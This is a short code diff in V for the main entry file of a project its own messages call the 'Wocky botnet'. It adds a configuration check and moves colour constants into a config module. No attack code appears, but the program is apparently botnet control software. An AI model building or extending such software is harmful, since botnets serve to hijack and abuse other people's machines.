@@ -10,11 +10,13 @@
 import os
 import mysql
 
+import core.config
 import core.wocky
 import core.utilities
 import core.term_control
 
 fn main() {
+	config.check_for_configuration()
 	mut w := wocky.Wocky{sqlconn: &mysql.Connection{
 		host: "localhost",
 		username: "root",
@@ -38,11 +40,11 @@ fn main() {
 	}
 
 	if w.bot_port == 0 {
-		println("${term_control.Red}[${utilities.current_time()}][+]${term_control.Default}  Error, No bot port was provided. The bot system did not start....")
+		println("${config.Red}[${utilities.current_time()}][x]${config.Default}  Error, No bot port was provided. The bot system did not start....")
 	}
 
 	if w.sqlconn.password == "" {
-		println("${term_control.Red}[${utilities.current_time()}][+]${term_control.Default}  Error, No MySQL password provided. Wocky botnet cannot start without a database......!")
+		println("${config.Red}[${utilities.current_time()}][x]${config.Default}  Error, No MySQL password provided. Wocky botnet cannot start without a database......!")
 		exit(0)
 	}
 
